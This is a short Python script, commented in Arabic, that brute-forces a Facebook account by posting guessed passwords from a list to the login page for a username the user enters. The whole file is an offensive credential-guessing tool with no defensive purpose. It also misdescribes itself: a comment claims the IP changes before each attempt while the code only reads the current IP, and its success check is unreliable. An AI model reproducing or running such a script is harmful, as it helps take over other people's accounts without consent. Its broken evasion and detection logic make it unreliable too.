import requests
import random
import time
import sys

# قائمة الكلمات المستخدمة للتخمين
passwords = ["islamislam", "islamislam1234567890", "islam123islam", ...]

# عنوان URL لصفحة تسجيل الدخول إلى Facebook
url = "https://www.facebook.com/login.php"

# عنوان IP الحالي
ip = requests.get("https://api.ipify.org").text

# واجهة المستخدم
def main():
    # اطلب من المستخدم إدخال اسم المستخدم
    username = input("أدخل اسم المستخدم: ")

    # ابدأ عملية التخمين
    for password in passwords:
        # قم بتغيير عنوان IP قبل كل محاولة
        ip = requests.get("https://api.ipify.org").text

        # قم بإنشاء بيانات POST
        data = {
            "email": username,
            "pass": password,
        }

        # قم بإرسال طلب POST
        response = requests.post(url, data=data)

        # تحقق من نجاح عملية التسجيل
        if "checkpoint" not in response.text:
            print("تم العثور على كلمة المرور!")
            print("كلمة المرور:", password)
            sys.exit()

        # انتظر 10 ثوانٍ قبل المحاولة التالية
        time.sleep(10)

if __name__ == "__main__":
    main()
